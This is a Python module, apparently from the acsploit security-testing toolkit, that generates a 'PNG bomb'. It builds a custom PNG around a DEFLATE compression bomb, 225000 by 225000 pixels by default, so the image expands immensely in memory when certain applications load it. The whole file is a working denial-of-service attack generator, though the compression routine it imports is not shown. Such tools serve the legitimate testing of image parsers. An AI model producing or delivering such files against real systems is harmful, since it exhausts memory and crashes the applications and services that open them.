from .deflate import max_deflate_png
from acsploit.options import Options

options = Options()
options.add_option('width', 225000, 'Desired width of uncompressed PNG in pixels')
options.add_option('height', 225000, 'Desired height of uncompressed PNG in pixels')

DESCRIPTION = 'Generates a PNG bomb.' \
              '\n\n  ' \
              'The PNG file output expands immensely when loaded into memory by certain applications. ' \
              'We construct a custom PNG file from scratch, inserting a DEFLATE compression bomb, as DEFLATE ' \
              'is the underlying compression used in PNG.'


# NOTE: We looked at using the pypng library for this instead of the custom deflate code
# While the png code is significantly simpler, it also takes significantly longer to run
# because the png library uses zlib for compression, whereas the custom implementation knows
# that the input is all zero bytes and thus can write out the compressed data directly

NO_INPUT = True
DEFAULT_OUTPUT = 'file'
DEFAULT_OUTPUT_OPTIONS = {
    'final_newline': False,
    'format': 'binary'
}


def run(output):
    ret = max_deflate_png(options['width'], options['height'])
    output.output([ret])
